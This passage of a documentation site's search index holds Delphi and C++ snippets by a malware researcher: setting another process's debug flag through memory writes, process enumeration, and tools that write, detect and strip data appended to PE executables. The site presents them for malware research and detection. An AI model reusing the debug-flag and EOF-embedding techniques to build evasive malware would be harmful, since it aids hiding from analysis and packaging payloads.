pDebugFlag, sizeOf(Byte), ABytesRead) then Exit; /// ADebugStatus := (pDebugFlag^ = 1); finally FreeMem(pDebugFlag); end; /// result := (ABytesRead = SizeOf(Byte)); finally CloseHandle(hProcess); end; end; {------------------------------------------------------------------------------- Update target process debug flag. ADebugStatus = True : Set target process debug flag. ADebugStatus = False : Unset target process debug flag. -------------------------------------------------------------------------------} function SetProcessDebugStatus(AProcessID : Cardinal; ADebugStatus : Boolean) : Boolean; var hProcess : THandle; pDebugFlagOffset : Pointer; ADebugFlag : Byte; ABytesWritten : SIZE_T; begin result := false; /// pDebugFlagOffset := GetDebugFlagPointer(AProcessID, hProcess); if not Assigned(pDebugFlagOffset) then Exit(); /// try if ADebugStatus then ADebugFlag := 1 else ADebugFlag := 0; if NOT WriteProcessMemory(hProcess, pDebugFlagOffset, @ADebugFlag, SizeOf(Byte), ABytesWritten) then Exit; /// result := (ABytesWritten = SizeOf(Byte)); finally CloseHandle(hProcess); end; end; initialization { Load NtQueryInformationProcess from NTDLL.dll } _NtQueryInformationProcess := nil; hNTDLL := LoadLibrary('ntdll.dll'); if (hNTDLL \u0026lt;\u0026gt; 0) then @_NtQueryInformationProcess := GetProcAddress(hNTDLL, 'NtQueryInformationProcess'); finalization _NtQueryInformationProcess := nil; if (hNTDLL \u0026lt;\u0026gt; 0) then FreeLibrary(hNTDLL); end. ````"});index.add({'id':34,'href':'/docs/windows/snippets/delphi/enum-process-method-1/','title':"Enum Process Method 1",'content':"This is one of the most famous method to enumerate running process on Windows.\nIf AFilterSameArch is set to True, only processes running with same architecture as current process will be listed.\n{ Jean-Pierre LESUEUR (@DarkCoderSc) Example: ... var AProcessName : String; AProcessId : Cardinal; AProcessList : TDictionary\u0026lt;Integer, String\u0026gt;; begin AProcessList := EnumProcess(True); try for AProcessId in AProcessList.Keys do begin if NOT AProcessList.TryGetValue(AProcessId, AProcessName) then continue; /// ... end; finally if Assigned(AProcessList) then FreeAndNil(AProcessList); end; end; } //... uses tlhelp32, SysUtils, Windows, Generics.Collections; //... function EnumProcess(AFilterSameArch : Boolean = False) : TDictionary\u0026lt;Integer {Process Id}, String {Process Name}\u0026gt;; var ASnap : THandle; AProcessEntry : TProcessEntry32; AProcessName : String; procedure AppendEntry(); begin if AFilterSameArch and ((IsProcessX64(GetCurrentProcessId())) \u0026lt;\u0026gt; (IsProcessX64(AProcessEntry.th32ProcessID))) then Exit(); /// result.Add(AProcessEntry.th32ProcessID, AProcessEntry.szExeFile); end; begin result := TDictionary\u0026lt;Integer, String\u0026gt;.Create(); /// ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0); if ASnap = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32First(ASnap, AProcessEntry) then Exit(); AppendEntry(); while True do begin ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32Next(ASnap, AProcessEntry) then break; AppendEntry(); end; finally CloseHandle(ASnap); end; end; "});index.add({'id':35,'href':'/docs/windows/snippets/delphi/is-process-64/','title':"Is Process 64bit",'content':"Tiny snippet to know whether or not target process id is running under 32bit or 64bit architecture.\nIf result is True, target process is running under 64bit architecture.\nIf result is False, target process is running under 32bit architecture.\n// // Jean-Pierre LESUEUR @DarkCoderSc // // ... uses Windows, SysUtils; // ... type TArchitecture = (x86, x64, xUnknown); // ... function IsProcessX64(AProcessId : Cardinal) : TArchitecture; var AProcHandle : THandle; AWow64Process : bool; begin result := xUnknown; /// { If we are not in a 64Bit system then we are for sure in a 32Bit system } if (TOSVersion.Architecture = arIntelX86) then Exit(); /// AProcHandle := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, AProcessId); if AProcHandle = 0 then Exit; try isWow64Process(AProcHandle, AWow64Process); /// if AWow64Process then result := x86 else result := x64; finally CloseHandle(AProcHandle); end; end; "});index.add({'id':36,'href':'/docs/windows/projects/freeware/','title':"Freeware",'content':"Freeware Section   Winja (VirusTotal Uploader) - Binary  "});index.add({'id':37,'href':'/docs/windows/projects/freeware/winja/','title':"Winja (VirusTotal Uploader) - Binary",'content':"Winja is a free application for Microsoft Windows that lets you find potential malware on your system. It uses the scanning engine of virtually all antivirus products in the market to give you a very precise idea of the risk posed by a particular file.\nTwo concrete examples of using Winja:  You have downloaded a file from the Internet, you want to remove as many doubts as possible. Drag this file onto the main window and wait for the results that will appear on your desktop. You suspect your computer is infected. Scan all services and processes for malware.  To do this, Winja first uses the VirusTotal public API to submit the fingerprint of a file. If this fingerprint exists, Winja returns the existing analysis report. If not (with your previously set permission), Winja sends the unknown file to VirusTotal servers for scanning. It is also possible for you to have files (called samples) analyzed again at any time to update the detection ratio.\nWinja lets you, very simply and quickly, find suspicious files in places favored by malware:  Active Processes Processes that use network resources (that connect to the Internet) Services Applications that start with Windows Task Scheduler  You can also easily drag and drop files to the main Winja window or to the desktop gadget to scan them.\nThe final example of scanning is the use of an extension for Windows Explorer that allows you to request a scan by right-clicking on one or more files from your file browser.\nSince version 6, Winja is available in French following strong demand from the French-speaking community.\nWinja is cited and recommended by VirusTotal (a subsidiary of Google) as an alternative to their own desktop application for Windows: https://support.virustotal.com/hc/en-us/articles/115002179065-Desktop-apps\nFor our part, as well as theirs, we make sure that this application is a complement to your favorite antivirus and does not put at risk the antivirus brands that lend us their signatures free of charge.\nFor this reason, Winja remains a passive analysis tool and is not a substitute for the installation and use of an antivirus software.\n Download  "});index.add({'id':38,'href':'/docs/windows/projects/opensource/eof-reader/','title':"EOF Reader (C++)",'content':"EOF Reader is a tiny Visual C++ project designed to detect the presence of EOF (End Of File) data on both 32bit and 64bit valid Portable Executable Files.\nAfter creating a similar project in Pascal/Delphi, I decided to port the code in C++.\nSome Antivirus Software using similar technique to flag some Malware generically. There are very few if no legitimate reason at all to append data at the end of a PE File.\nFeatures (Support both 32bit and 64bit PE Files)  Detect presence of EOF Data from valid PE Files. If present, dump EOF Data to console. Possibility to write extracted EOF Data to file.  Get the project code git clone https://github.com/DarkCoderSc/eof-reader.git\nSuccessfully compiled with Visual Studio 2019.\nMain source file /* ----------------------------------------------------------------------------- Jean-Pierre LESUEUR (@DarkCoderSc) jplesueur@phrozen.io License : MIT Read EOF (End Of File) Data from PE File. Based on my previous work : https://github.com/DarkCoderSc/peof-detector/blob/master/UntEOF.pas Compiled with : Visual Studio 2019 (Community) Notice : If you have any advices for improving the code or if you have any issues, feel free to contact me.\tC++ is not yet my main language, always willing to learn ;-) ----------------------------------------------------------------------------- */ #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026quot;windows.h\u0026quot; #include \u0026lt;iomanip\u0026gt; #include \u0026lt;sstream\u0026gt; #include \u0026quot;termcolor/termcolor.hpp\u0026quot; using namespace std; /* Log functions */ void log_error(const string \u0026amp;message) { cerr \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; termcolor::bloodred \u0026lt;\u0026lt; \u0026quot;x\u0026quot; \u0026lt;\u0026lt; termcolor::reset \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; message \u0026lt;\u0026lt; endl; } void log_debug(const string \u0026amp;message) { cout \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; \u0026quot;*\u0026quot; \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; message \u0026lt;\u0026lt; endl; } void log_success(const string \u0026amp;message) { cout \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; termcolor::lime \u0026lt;\u0026lt; \u0026quot;*\u0026quot; \u0026lt;\u0026lt; termcolor::reset \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; message \u0026lt;\u0026lt; endl; } void log_warn(const string \u0026amp;message = \u0026quot;\u0026quot;) { cout \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; termcolor::yellow \u0026lt;\u0026lt; \u0026quot;!\u0026quot; \u0026lt;\u0026lt; termcolor::reset \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; message \u0026lt;\u0026lt; endl; } /* Dump memory data to console. */ void HexDumpBufferToConsole(PVOID pBuffer, __int64 ABufferSize) { cout \u0026lt;\u0026lt; \u0026quot;| ------------------------------------------------|------------------|\u0026quot; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026quot;| 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | |\u0026quot; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026quot;| ------------------------------------------------|------------------|\u0026quot; \u0026lt;\u0026lt; endl; for (int j = 0; j \u0026lt; ceil(ABufferSize / 16); j++) { char AsciiColumns[17]; stringstream ARow; for (int i = 0; i \u0026lt; 16; i++) { unsigned char AChar = ((char*)pBuffer)[(j * 16) + i]; if (!isprint(AChar)) { AChar = 46; // . } ARow \u0026lt;\u0026lt; setfill('0') \u0026lt;\u0026lt; setw(2) \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; static_cast\u0026lt;unsigned int\u0026gt;(AChar) \u0026lt;\u0026lt; \u0026quot; \u0026quot;; AsciiColumns[i] = AChar; } AsciiColumns[16] = 0; // Add null terminated character. cout \u0026lt;\u0026lt; \u0026quot;| \u0026quot; \u0026lt;\u0026lt; ARow.rdbuf() \u0026lt;\u0026lt; \u0026quot;| \u0026quot; \u0026lt;\u0026lt; AsciiColumns \u0026lt;\u0026lt; \u0026quot; |\u0026quot; \u0026lt;\u0026lt; endl; } cout \u0026lt;\u0026lt; \u0026quot;| ------------------------------------------------|------------------|\u0026quot; \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; endl; } /* Dump memory data to file. */ bool WriteBufferToFile(PVOID pBuffer, __int64 ABufferSize, wstring ADestFile, PDWORD AErrorCode) { SetLastError(0); HANDLE hFile = CreateFile(ADestFile.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); if (hFile == INVALID_HANDLE_VALUE) { *AErrorCode = GetLastError(); return false; } DWORD dwBytesWritten = 0; if (!WriteFile(hFile, pBuffer, ABufferSize, \u0026amp;dwBytesWritten, nullptr)) { *AErrorCode = GetLastError(); CloseHandle(hFile); return false; } CloseHandle(hFile); return true; } /* Basic way to read file size from disk */ __int64 GetFileSize(wchar_t AFileName[MAX_PATH]) { LARGE_INTEGER AFileSize; AFileSize.LowPart = 0; AFileSize.HighPart = 0; ifstream ifile(AFileName); if (ifile) {\tWIN32_FILE_ATTRIBUTE_DATA lpFileInfo; if (GetFileAttributesExW(AFileName, GetFileExInfoStandard, \u0026amp;lpFileInfo)) {\tAFileSize.HighPart = lpFileInfo.nFileSizeHigh; AFileSize.LowPart = lpFileInfo.nFileSizeLow; } } return AFileSize.QuadPart; } int main(int argc, char* argv[]) { if (argc != 2) { cout \u0026lt;\u0026lt; \u0026quot;Usage : readeof.exe \\\u0026quot;C:\\\\suspicious.exe\\\u0026quot;\u0026quot; \u0026lt;\u0026lt; endl; return 0; } wchar_t AFileName[MAX_PATH] = { 0 }; for (int i = 0; i \u0026lt; strlen(argv[1]); i++) { AFileName[i] = argv[1][i]; } //GetModuleFileNameW(0, AFileName, MAX_PATH);\twcout \u0026lt;\u0026lt; \u0026quot;Working on \\\u0026quot;\u0026quot; \u0026lt;\u0026lt; AFileName \u0026lt;\u0026lt; \u0026quot;\\\u0026quot; : \u0026quot; \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; endl; /* Get target file size on disk. */ __int64 AFileSize = GetFileSize(AFileName); if (AFileSize \u0026lt;= 0) { log_error(\u0026quot;Could not get target file size on disk. Abort.\u0026quot;); return 0; } log_success(\u0026quot;File size on disk : \u0026quot; + to_string(AFileSize) + \u0026quot; bytes\u0026quot;); /* Now we will compare with image size described by the PE Header. */ DWORD dwBytesRead = 0;\tHANDLE hFile = CreateFile(AFileName, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, 0); if (hFile == INVALID_HANDLE_VALUE) { log_error(\u0026quot;Could not open target file.\u0026quot;); return 0; } SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);\t/* Read IMAGE_DOS_HEADER */ IMAGE_DOS_HEADER AImageDosHeader; if (!ReadFile(hFile, \u0026amp;AImageDosHeader, sizeof(IMAGE_DOS_HEADER), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read IMAGE_DOS_HEADER.\u0026quot;); CloseHandle(hFile); return 0; } if (AImageDosHeader.e_magic != IMAGE_DOS_SIGNATURE) { log_error(\u0026quot;Not a valid PE File.\u0026quot;); CloseHandle(hFile); return 0; } SetFilePointer(hFile, AImageDosHeader.e_lfanew, nullptr, FILE_BEGIN); /* Verify if if we match IMAGE_NT_SIGNATURE (0x4550) */ DWORD AImageNTSignature; if (!ReadFile(hFile, \u0026amp;AImageNTSignature, sizeof(DWORD), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read IMAGE_NT_SIGNATURE.\u0026quot;); CloseHandle(hFile); return 0; } if (AImageNTSignature != IMAGE_NT_SIGNATURE) { log_error(\u0026quot;IMAGE_NT_SIGNATURE Doesn't match.\u0026quot;); CloseHandle(hFile); return 0; } log_success(\u0026quot;The file is likely a valid PE File.\u0026quot;); /* At this point, we are enough sure we are facing a valid PE File. Reading IMAGE_FILE_HEADER */ IMAGE_FILE_HEADER AImageFileHeader; if (!ReadFile(hFile, \u0026amp;AImageFileHeader, sizeof(IMAGE_FILE_HEADER), \u0026amp;dwBytesRead, nullptr)) { cout \u0026lt;\u0026lt; \u0026quot;Could not read IMAGE_FILE_HEADER.\u0026quot; \u0026lt;\u0026lt; endl; CloseHandle(hFile); return 0; } // Checking if we are facing a x64 or x86 PE File. bool x64 = (AImageFileHeader.Machine == IMAGE_FILE_MACHINE_AMD64); log_debug(string(\u0026quot;Facing \u0026quot;) + (x64 ? \u0026quot;64\u0026quot; : \u0026quot;32\u0026quot;) + string(\u0026quot;bit PE File.\u0026quot;)); __int64 AImageSize = 0; /* Reading IMAGE_OPTIONAL_HEADER. Support both x64 and x64. */ if (x64) { IMAGE_OPTIONAL_HEADER64 AOptionalHeader; if (!ReadFile(hFile, \u0026amp;AOptionalHeader, sizeof(IMAGE_OPTIONAL_HEADER64), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read IMAGE_OPTIONAL_HEADER64\u0026quot;); CloseHandle(hFile); return 0; } /* We don't forget to add the IMAGE_DIRERCTORY_ENTRY_SECURITY if target application is signed otherwise the full image size wont match. */ AImageSize += (__int64(AOptionalHeader.SizeOfHeaders) + __int64(AOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size)); } else { IMAGE_OPTIONAL_HEADER32 AOptionalHeader; if (!ReadFile(hFile, \u0026amp;AOptionalHeader, sizeof(IMAGE_OPTIONAL_HEADER32), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read IMAGE_OPTIONAL_HEADER32\u0026quot;); CloseHandle(hFile); return 0; } // Same as above AImageSize += (__int64(AOptionalHeader.SizeOfHeaders) + __int64(AOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size)); } /* Enumerate each sections, and append to our current mesured image size. */ for (int i = 0; i \u0026lt; AImageFileHeader.NumberOfSections; i++) { IMAGE_SECTION_HEADER AImageSectionHeader; if (!ReadFile(hFile, \u0026amp;AImageSectionHeader, sizeof(IMAGE_SECTION_HEADER), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Fail to read section n°\u0026quot; + to_string(i)); CloseHandle(hFile); return 0; // If one section fail to be read, then we loose. } AImageSize += AImageSectionHeader.SizeOfRawData; } log_success(\u0026quot;Image Size successfully calculated : \u0026quot; + to_string(AImageSize) + \u0026quot; bytes\u0026quot;); /* Checking if some EOF data is present in target file. */ unsigned AEOFSize = (AFileSize - AImageSize); if (AEOFSize \u0026gt; 0) { log_warn(to_string(AEOFSize) + \u0026quot; bytes of EOF Data detected.\u0026quot;); /* Read EOF Data */ log_debug(\u0026quot;Extracting / Printing EOF Data:\u0026quot;); cout \u0026lt;\u0026lt; endl; SetFilePointer(hFile, (AFileSize - AEOFSize), nullptr, FILE_BEGIN); // Could also use FILE_END PVOID pBuffer = malloc(AEOFSize); if (!ReadFile(hFile, pBuffer, AEOFSize, \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read EOF data.\u0026quot;); } else { /* Print EOF data. */ HexDumpBufferToConsole(pBuffer, AEOFSize);\t} /* Offering user to dump EOF Data to file */ cout \u0026lt;\u0026lt; \u0026quot;Do you want to dump the content of EOF Data ? (y/n) : \u0026quot;; string s = \u0026quot;\u0026quot;; cin.width(1); // we only take care of first character. cin \u0026gt;\u0026gt; s; if (s == \u0026quot;y\u0026quot;) { cout \u0026lt;\u0026lt; \u0026quot;Output file path : \u0026quot;; wstring AOutputPath; cin.width(MAX_PATH); wcin \u0026gt;\u0026gt; AOutputPath; /* Write EOF data to file */ DWORD AErrorCode = 0; if (!WriteBufferToFile(pBuffer, AEOFSize, AOutputPath, \u0026amp;AErrorCode)) { log_error(\u0026quot;Could no write EOF data to file with error \u0026quot; + to_string(AErrorCode)); } else { log_success(\u0026quot;EOF data successfully dumped.\u0026quot;); }; } free(pBuffer); } else { log_success(\u0026quot;No EOF data detected so far.\u0026quot;); } CloseHandle(hFile); return 0; } "});index.add({'id':39,'href':'/docs/windows/snippets/delphi/eof/','title':"Manipulation and Detection of EOF",'content':"Description This Delphi unit demonstrate how to manipulate EOF Data of a Valid Microsoft Windows Portable Executable (PE) File.\nEOF (End Of File) is often used by Malware authors to offer their Malware users a way to edit Malware payload configuration (Ex: C2 informations) without having access to source code.\nYou often encounter such techniques in:\n Remote Access Tool/Trojan (RAT) File Wrapper / Binder Downloader Loader / Botnets  But not only.\nSupported Features (32bit and 64bit)  Write EOF Data to Valid PE File. Read EOF Data from Valid PE File. Clear EOF Data if Present in Valid PE File . Retrieve EOF Data Size if Present in Valid PE File. Detect EOF Data presence in Valid PE File.  Resources  https://gist.github.com/DarkCoderSc/33314f50f5199cf49dbdf7a29a7f4a69  C/C++ Implementation (Read / Extract) https://github.com/DarkCoderSc/eof-reader\nCode (******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ Description: -\u0026gt; Unit for EOF manipulation on Portable Executable Files (x86/x64). -\u0026gt; Detection and Removal of EOF Data (Often used by Malware to store configuration / files etc..). Category: -\u0026gt; Malware Research \u0026amp; Detection License: -\u0026gt; MIT Functions: -\u0026gt; WritePEOF() : Write extra data at the end of a PE File. -\u0026gt; ReadPEOF() : Read extra data stored at the end of a PE File. -\u0026gt; FileIsValidPE() : Check whether or not a file is a valid Portable Executable File. -\u0026gt; ClearPEOF() : Remove / Sanitize / Disinfect a PE File from any extra data stored at it end. -\u0026gt; GetPEOFSize() : Get the size of the extra data stored at the end of a PE File. -\u0026gt; GetFileSize() : Get the expected file size of a PE File following PE Header description. -\u0026gt; ContainPEOF() : Return True if some extra data is detected at the end of a PE File. *******************************************************************************) unit UntEOF; interface uses WinAPI.Windows, System.SysUtils, Classes; type TBasicPEInfo = record Valid : Boolean; // True = Valid PE; False = Invalid PE Arch64 : Boolean; // True = 64bit Image; False = 32bit Image ImageSize : Int64; end; function WritePEOF(APEFile : String; ABuffer : PVOID; ABufferSize : Integer) : Boolean; function ReadPEOF(APEFile : String; ABuffer : PVOID; ABufferSize : Integer; ABufferPos : Integer = 0) : Boolean; function FileIsValidPE(AFileName : String) : Boolean; function ClearPEOF(APEFile : String) : Boolean; function GetPEOFSize(APEFile : String) : Int64; function GetFileSize(AFileName : String) : Int64; function ContainPEOF(APEFile : String) : Boolean; implementation {------------------------------------------------------------------------------- Get File Size (Nothing more to say) -------------------------------------------------------------------------------} function GetFileSize(AFileName : String) : Int64; var AFileInfo : TWin32FileAttributeData; begin result := 0; if NOT FileExists(AFileName) then Exit(); if NOT GetFileAttributesEx( PWideChar(AFileName), GetFileExInfoStandard, @AFileInfo) then Exit(); /// result := (Int64(AFileInfo.nFileSizeLow) or Int64(AFileInfo.nFileSizeHigh shl 32)); end; {------------------------------------------------------------------------------- Is target file a 64bit PE file -------------------------------------------------------------------------------} function GetBasicPEInfo(APEFile : String; var ABasicPEInfo : TBasicPEInfo) : Boolean; var hFile : THandle; AImageDosHeader : TImageDosHeader; dwBytesRead : DWORD; AImageFileHeader : TImageFileHeader; AImageNtHeaderSignature : DWORD; AOptionalHeader32 : TImageOptionalHeader32; AOptionalHeader64 : TimageOptionalHeader64; I : Integer; AImageSectionHeader : TimageSectionHeader; begin result := False; ABasicPEInfo.Valid := False; ABasicPEInfo.Arch64 := False; ABasicPEInfo.ImageSize := 0; // Open Target File (Must Exists) hFile := CreateFile( PChar(APEFile), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0 ); if hFile = INVALID_HANDLE_VALUE then Exit; try SetFilePointer(hFile, 0, nil, FILE_BEGIN); // Read the Image Dos Header if NOT ReadFile( hFile, AImageDosHeader, SizeOf(TImageDosHeader), dwBytesRead, nil ) then Exit(); // To be considered as a valid PE file, e_magic must be $5A4D (MZ) if (AImageDosHeader.e_magic \u0026lt;\u0026gt; IMAGE_DOS_SIGNATURE) then Exit(); // Move the cursor to Image NT Signature SetFilePointer(hFile, AImageDosHeader._lfanew, nil, FILE_BEGIN); // Read the Image NT Signature if NOT ReadFile( hFile, AImageNtHeaderSignature, SizeOf(DWORD), dwBytesRead, nil ) then Exit(); // To be considered as a valid PE file, Image NT Signature must be $00004550 (PE00) if (AImageNtHeaderSignature \u0026lt;\u0026gt; IMAGE_NT_SIGNATURE) then Exit(); ABasicPEInfo.Valid := True; // Read the Image File Header if NOT ReadFile( hFile, AImageFileHeader, sizeOf(TImageFileHeader), dwBytesRead, 0 ) then Exit(); // TImageDosHeader.Machine contains the architecture of the file ABasicPEInfo.Arch64 := (AImageFileHeader.Machine = IMAGE_FILE_MACHINE_AMD64); if ABasicPEInfo.Arch64 then begin // For 64bit Image if NOT ReadFile( hFile, AOptionalHeader64, sizeOf(TImageOptionalHeader64), dwBytesRead, 0 ) then Exit(); Inc(ABasicPEInfo.ImageSize, AOptionalHeader64.SizeOfHeaders); Inc(ABasicPEInfo.ImageSize, AOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size); end else begin // For 32bit Image if NOT ReadFile( hFile, AOptionalHeader32, sizeOf(TImageOptionalHeader32), dwBytesRead, 0 ) then Exit(); Inc(ABasicPEInfo.ImageSize, AOptionalHeader32.SizeOfHeaders); Inc(ABasicPEInfo.ImageSize, AOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size); end; // Iterate through each section to get the size of each for ImageSize calculation for I := 0 to AImageFileHeader.NumberOfSections -1 do begin if NOT ReadFile( hFile, AImageSectionHeader, SizeOf(TImageSectionHeader), dwBytesRead, 0 ) then Exit(); // Fatal Inc(ABasicPEInfo.ImageSize, AImageSectionHeader.SizeOfRawData); end; // All steps successfully passed result := True; finally CloseHandle(hFile); end; end; {------------------------------------------------------------------------------- Is target file a valid Portable Executable -------------------------------------------------------------------------------} function FileIsValidPE(AFileName : String) : Boolean; var ABasicPEInfo : TBasicPEInfo; begin result := False; /// GetBasicPEInfo(AFileName, ABasicPEInfo); result := ABasicPEInfo.Valid; end; {------------------------------------------------------------------------------- Write Data to the End of a PE File. -------------------------------------------------------------------------------} function WritePEOF(APEFile : String; ABuffer : PVOID; ABufferSize : Integer) : Boolean; var hFile : THandle; ABytesWritten : Cardinal; begin result := false; if NOT FileIsValidPE(APEFile) then Exit(); hFile := CreateFile( PWideChar(APEFile), GENERIC_WRITE, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ); if hFile = INVALID_HANDLE_VALUE then Exit; try SetFilePointer(hFile, 0, nil, FILE_END); if NOT WriteFile( hFile, ABuffer^, ABufferSize, ABytesWritten, 0 ) then Exit(); result := true; finally CloseHandle(hFile); end; end; {------------------------------------------------------------------------------- Read Data from the End of a PE File. -------------------------------------------------------------------------------} function ReadPEOF(APEFile : String; ABuffer : PVOID; ABufferSize : Integer; ABufferPos : Integer = 0) : Boolean; var hFile : THandle; ABytesRead : Cardinal; begin result := false; if NOT FileIsValidPE(APEFile) then Exit(); hFile := CreateFile( PWideChar(APEFile), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ); if hFile = INVALID_HANDLE_VALUE then Exit(); try SetFilePointer( hFile, (-ABufferSize + ABufferPos), nil, FILE_END ); if NOT ReadFile( hFile, ABuffer^, ABufferSize, ABytesRead, 0 ) then Exit(); result := true; finally CloseHandle(hFile); end; end; {------------------------------------------------------------------------------- Get Target PE File EOF Size return codes: ------------- -1 : Error \u0026gt;= 0 : The length of EOF data found -------------------------------------------------------------------------------} function GetPEOFSize(APEFile : String) : Int64; var ABasicPEInfo : TBasicPEInfo; begin result := -1; if NOT GetBasicPEInfo(APEFile, ABasicPEInfo) then raise Exception.Create('Error: Invalid PE File'); result := (GetFileSize(APEFile) - ABasicPEInfo.ImageSize); end; {------------------------------------------------------------------------------- Clear unexpected data at the end of a PE File -------------------------------------------------------------------------------} function ClearPEOF(APEFile : String) : Boolean; var ABasicPEInfo : TBasicPEInfo; AFileStream : TMemoryStream; AFileSize : Int64; AImageSize : Int64; begin result := False; if NOT GetBasicPEInfo(APEFile, ABasicPEInfo) then raise Exception.Create('Error: Invalid PE File'); AFileSize := GetFileSize(APEFile); AImageSize := ABasicPEInfo.ImageSize; // No EOF but no error so far so we return true if (AFileSize - AImageSize) = 0 then begin Exit(True); end; { One technique to patch the file. Ignore content after the ImageSize grabbed from PE info. } AFileStream := TMemoryStream.Create(); try AFileStream.LoadFromFile(APEFile); AFileStream.Position := 0; AFileStream.SetSize(AImageSize); AFileStream.SaveToFile(APEFile); finally AFileStream.Free; end; result := True; end; {------------------------------------------------------------------------------- Detect if a PE file contain some data at the end of the file -------------------------------------------------------------------------------} function ContainPEOF(APEFile : String) : Boolean; begin result := (GetPEOFSize(APEFile) \u0026gt; 0); end; end. "});})();